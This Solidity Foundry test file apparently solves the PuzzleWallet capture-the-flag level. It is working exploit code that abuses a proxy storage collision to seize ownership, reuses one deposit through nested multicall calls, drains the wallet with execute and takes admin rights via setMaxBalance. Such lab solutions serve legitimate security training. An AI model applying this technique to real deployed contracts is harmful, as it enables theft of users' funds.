// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/levels/PuzzleWallet/PuzzleWallet.sol";
import "../src/levels/PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletTest is Test {
    event Log(bytes[]);

    PuzzleWalletFactory public factory;
    PuzzleWallet public instance;
    address public player = address(0x100);

    function setUp() public {
        factory = new PuzzleWalletFactory();
        instance = PuzzleWallet(factory.createInstance{value: 0.001 ether}(player));
    }

    function testPuzzleWalletAttack() public {
        vm.deal(player, 0.001 ether);
        PuzzleProxy(payable(address(instance))).proposeNewAdmin(player);

        vm.startPrank(player);

        instance.addToWhitelist(player);

        bytes[] memory deposit = new bytes[](1);
        deposit[0] = abi.encodeWithSelector(instance.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit[0];
        data[1] = abi.encodeWithSelector(instance.multicall.selector, deposit);

        instance.multicall{value: 0.001 ether}(data);
        instance.execute(player, 0.002 ether, "");
        instance.setMaxBalance(uint256(player));

        vm.stopPrank();

        assertTrue(instance.whitelisted(player));
        assertEq(instance.maxBalance(), uint256(player));

        assertTrue(factory.validateInstance((payable(address(instance))), player));
    }
}
